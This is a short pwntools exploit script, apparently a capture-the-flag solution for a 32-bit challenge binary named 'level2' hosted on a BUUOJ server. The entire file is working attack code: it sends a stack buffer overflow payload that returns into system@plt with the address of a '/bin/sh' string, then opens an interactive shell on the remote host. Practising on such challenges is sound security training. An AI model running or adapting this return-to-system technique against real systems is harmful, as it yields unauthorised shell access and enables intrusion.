#!/usr/bin/python3.6
from pwn import *

filename = './level2'
elf = ELF(filename)
# proc = process(filename)
proc = remote('node3.buuoj.cn', 29352)
# ROPgadget --binary level2 --string '/bin/sh'
str_bin_sh = 0x0804a024
main_addr = elf.sym['main']
system_plt = elf.plt['system']

proc.recvuntil(b'Input:\n')
payload = b'i' * (0x88 + 4) + p32(system_plt) + p32(main_addr) + p32(str_bin_sh)

proc.sendline(payload)
proc.interactive()
